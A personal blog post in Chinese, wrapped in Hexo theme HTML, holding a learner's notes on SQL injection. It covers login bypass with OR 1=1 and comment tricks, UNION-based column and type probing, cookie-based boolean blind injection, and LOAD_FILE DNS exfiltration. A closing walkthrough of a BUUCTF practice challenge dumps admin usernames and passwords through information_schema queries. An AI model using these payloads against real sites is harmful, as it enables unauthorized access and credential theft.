@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+	<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+		
+<title>sql注入笔记-Quiet</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">
+
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+<meta name="keywords" content="黑客,hackbar,sql注入,mysql,cookie,">
+<meta name="description" content="">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/index.js"></script>
+
+
+<script src="/js/fancybox.umd.js"></script>
+
+
+<script src="/js/fancybox-images.js"></script>
+
+
+<script src="/js/gitalk.min.js"></script>
+
+
+<script src="/js/hljs.min.js"></script>
+ 
+<script>hljs.highlightAll();</script>
+
+	<meta name="generator" content="Hexo 6.3.0"></head>
+
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Joey</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">HOME</a>
+        </li>
+        
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
+        
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
+        
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
+        
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'>
+</div>
+<style>
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
+        right: 0;
+        bottom: 0;
+        z-index: 1998;
+    }
+    .sidebar {
+        width: 66%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					right: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					right: "-100%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('https://api.ixiaowai.cn/gqapi/gqapi.php')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/黑客">黑客</a></li>
+            
+            <li><a href="/tags/hackbar">hackbar</a></li>
+            
+            <li><a href="/tags/sql注入">sql注入</a></li>
+            
+            <li><a href="/tags/mysql">mysql</a></li>
+            
+            <li><a href="/tags/cookie">cookie</a></li>
+            
+            
+        </ul>
+        
+        <h1>sql注入笔记</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Joey</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                </div>
+                <p>2023-03-30 17:24:54</p>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="post-content" id="content">
+  
+  <div id="article" class="post-content-info">
+    
+
+    <p><em>首先，sql注入可以通过url(应该都知道吧)链接、表单输入等途径实现，可以使用hackbar、burp等工具（sql语句不区分大小写）</em></p>
+<h1 id="sql语法"><a href="#sql语法" class="headerlink" title="sql语法"></a>sql语法</h1><p><strong>例如：现在有一个保存在数据库中的用户名密码表</strong></p>
+<p>叫allusers</p>
+<p><strong>选取表格里面的所有内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM allusers</span><br></pre></td></tr></table></figure>
+
+<p><strong>在上面的基础上，选取指定的用户名、密码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最简单的sql注入：</strong></p>
+<p>将上面的语句改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27;’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可见多加了一个  ‘  此条语句报错，黑客通过错误代码，可以得知sql注点</p>
+<p>若将语句改为这样，– 这个符号后面的被解释为注释，不执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释</strong>不被执行，则可以直接通过用户名而不需要密码登陆账户，但是前提是得知道正确的用户名</p>
+<p>若不知道正确的用户名，该怎么办？</p>
+<p>由于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此语句用 AND 连接，有个判断AND前后真假值的流程</p>
+<p>若是用OR连接两个条件，并且确保有一个条件永真，则整条语句被判断为真</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE username =‘admin&#x27; OR 1=1 -- ’ AND password =&#x27;pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>sql里合并两个表格内容：</strong></p>
+<p>用UNION 连接俩个SELECT语句，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT * FROM table2</span><br></pre></td></tr></table></figure>
+
+<p>在mysql中，<strong>UNION SELECT</strong> 后面可以不加指定表格名字，直接加 NULL</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT NULL,NULL</span><br></pre></td></tr></table></figure>
+
+<p>后面加一个NULL,若是没有报错，则表明table1这个表格是一列，</p>
+<p>后面加俩个NULL,若是没有报错，则表明table1这个表格是俩列，</p>
+<p>因此，黑客可以一直用NULL测试，知道没有报错，从而得知table1 是个几列表格</p>
+<p>假如我现在使用下面语句进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT **NULL,NULL**，NULL FROM allusers</span><br></pre></td></tr></table></figure>
+
+<p>意思是将allusers和table1进行合并（具体怎么并目前还没搞清楚）</p>
+<p>但是，如果如果allusers的各个数据类型和table1不一致，则无法完成合并（UNION合并必须保证数据类型和列数一致，例如：数字和字符不是一个数据类型）</p>
+<p>因此，还要对数据类型进行测试，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 UNION SELECT ‘1’ , NULL , NULL		报错</span><br><span class="line"></span><br><span class="line">SELECT * FROM table1 UNION SELECT NULL , ’2‘,  NULL		报错</span><br><span class="line"></span><br><span class="line">SELECT * FROM table1 UNION SELECT NULL,NULL,&#x27;3&#x27;		通过</span><br></pre></td></tr></table></figure>
+
+<p>则可以得知，第三列为数字</p>
+<p>注入：</p>
+<p>在可注入的地方，加入 ’ 中止数据内容，并加入注释关键词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 WHERE name=&#x27;admin&#x27; --&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这时候，在中间注入<strong>UNION</strong>语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table1 WHERE name=&#x27;admin&#x27;  UNION SELECT NULL,username，password FROM allusers --&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>一般不加保护的数据库的网站，就会将合并新内容后的表展示在页面上，这时就可以知道账户密码了</p>
+<h3 id="要是有保护？该怎么办？"><a href="#要是有保护？该怎么办？" class="headerlink" title="要是有保护？该怎么办？"></a>要是有保护？该怎么办？</h3><h3 id="利用cookie！"><a href="#利用cookie！" class="headerlink" title="利用cookie！"></a>利用cookie！</h3><p>cookie保存在数据库中</p>
+<p>cookie向服务器发展出请求，数据库利用相关语句查找cookie：</p>
+<p>cookie请求数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:cookieid=astljs</span><br></pre></td></tr></table></figure>
+
+<p>随后数据库查找存储的cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此时，可以修改cookie的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>若页面未改变，则表示可以注入</p>
+<p>如果我们故意让逻辑判错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND 1=0  --‘</span><br></pre></td></tr></table></figure>
+
+<p>此时页面出错，可以得知查询出错时页面状态</p>
+<p>此时便可以不断进行调试，根据页面状态判断调试结果的对错</p>
+<p>利用SUBSTRING语句进行判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(&#x27;password&#x27;,1,1) =&#x27;m&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>此语句的意思是：判断password字符串的第一个字符是否为m</p>
+<p>黑客可以将SUBSTRING里的第一个参数修改为一个查询语句，接下来就是不断发送请求，修改判断字符，爆破出密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;m&#x27; --‘</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">SELECT cookieid FROM allusers WHERE cookieid=&#x27;astljs&#x27; AND SUBSTRING(**(SELECT password FROM users WHERE user=&#x27;admin&#x27;)**,1,1) =&#x27;z&#x27; --‘</span><br></pre></td></tr></table></figure>
+
+<p>这就是所谓的<strong>布尔注入</strong>，是一种<strong>盲注</strong>（<em>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程为盲注</em>）</p>
+<p>当网站不返回页面时该怎么办呢？</p>
+<p>例如：向mysql注入LOAD_FILE()函数，给其提供域名，会触发DNS查询，如果在域名中动手脚，比如插入管理员密码查询语句，并且返回给黑客自己的服务器里，则可以间接得到管理员密码。</p>
+<h1 id="针对上面的教学，遇到实战问题："><a href="#针对上面的教学，遇到实战问题：" class="headerlink" title="针对上面的教学，遇到实战问题："></a>针对上面的教学，遇到实战问题：</h1><h2 id="1，在查表有几列时，不知道表的名字怎么办？"><a href="#1，在查表有几列时，不知道表的名字怎么办？" class="headerlink" title="1，在查表有几列时，不知道表的名字怎么办？"></a>1，在查表有几列时，不知道表的名字怎么办？</h2><p>注意：由于sql注入可以通过url链接进行，下面实例利可用hackbar进行，所写的sql语句是直接加在相关url链接后面的，例如：</p>
+<p><img src="https://i.328888.xyz/2023/03/30/iCQiro.png"></p>
+<p>直接用order by </p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 2</span><br></pre></td></tr></table></figure>
+
+<p>后面的数字可以自己更改来测试，此语句：按照查询结果的第三个列进行排序，实际用处就是判断相应的表的列存在与否，用1、2、3……依次试验，直到找到未响应的一个</p>
+<h2 id="2，如何判断显位点？"><a href="#2，如何判断显位点？" class="headerlink" title="2，如何判断显位点？"></a>2，如何判断显位点？</h2><p>当我们找到注入点后，想找到注入后哪里会回显我的需要的信息</p>
+<p>举个例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2 union select 1,2</span><br></pre></td></tr></table></figure>
+
+<p>具体来说，”id&#x3D;-1”是一个无效的条件，它被用来绕过原始查询语句中的WHERE子句。”union select 1,2”是一个新的SELECT语句，它将查询的结果与原始查询的结果进行联合。在这种情况下，新查询语句返回的结果是两个值1和2。</p>
+<p>（<em>下面的”id“是测试网址中的参数，由于其目的是制造无效条件，在其他不含id这个参数的网站中，只需要同样制造无效条件即可，下同</em>）</p>
+<h2 id="3，如何获取数据库名称？"><a href="#3，如何获取数据库名称？" class="headerlink" title="3，如何获取数据库名称？"></a>3，如何获取数据库名称？</h2><p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()</span><br></pre></td></tr></table></figure>
+
+<p>“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。</p>
+<p>“union”用于将两个或多个SELECT查询结果合并成一个结果集。</p>
+<p>“select 1”表示第一个查询结果为1。</p>
+<p>“database()”表示查询当前数据库的名称。在这个查询中，它返回的是当前数据库的名称，通常是用于确定数据库的名称，以便后续攻击。</p>
+<h2 id="4，得到数据库名字后，如何获取数据表的信息？"><a href="#4，得到数据库名字后，如何获取数据表的信息？" class="headerlink" title="4，得到数据库名字后，如何获取数据表的信息？"></a>4，得到数据库名字后，如何获取数据表的信息？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>“news”是实例中的数据库名称</p>
+<p>“id&#x3D;-1”是注入的查询条件，通常是一个无效的条件，它将会被忽略，因为它不符合任何实际数据的过滤条件。</p>
+<p>“union”用于将两个或多个SELECT查询结果合并成一个结果集。</p>
+<p>“select 1”表示第一个查询结果为1。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(select group_concat(table_name) from information_schema.tables where </span><br></pre></td></tr></table></figure>
+
+<p>table_schema&#x3D;’news’)”是一个子查询，它返回包含指定数据库中所有表名称的逗号分隔字符串。在这个查询中，它返回的是当前数据库中所有表名称的逗号分隔字符串。</p>
+<p>此步可得知数据表信息，例如数据表名字，得到数据表名字后，可进一步读取数据表中的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;news&#x27; and table_name=&#x27;admin&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>“admin”、”contents”是此实例中的表的名称</p>
+<p>实例中得到字段名称id、usernames、password（<em>未放示意图</em>）</p>
+<p>获取usernames的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(username) from admin)</span><br></pre></td></tr></table></figure>
+
+<p>获取password信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(select group_concat(password) from admin)</span><br></pre></td></tr></table></figure>
+
+<p>得到密码！</p>
+<p><em>本实例地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> 里的basic板块下的BBUU SQL COURSE 1 1题目</em></p>
+
+  </div>
+  <div id="gitalk-container"></div>
+</div>
+
+<script>
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+    <a href="/2023/04/02/c++%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95/">
+        <div class="post-paging-last">
+            <span>上一篇</span>
+            <p>c++实验记录</p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2023/03/29/ai%E4%BA%A7%E5%93%81/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>AI合集</p>
+        </div>
+    </a>
+    
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2023 By Joey. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
+</script>
+
+
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        
+        if(Boolean('true')){
+            gitalk.render('gitalk-container')
+        }
+    </script>
+
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+</html>
+
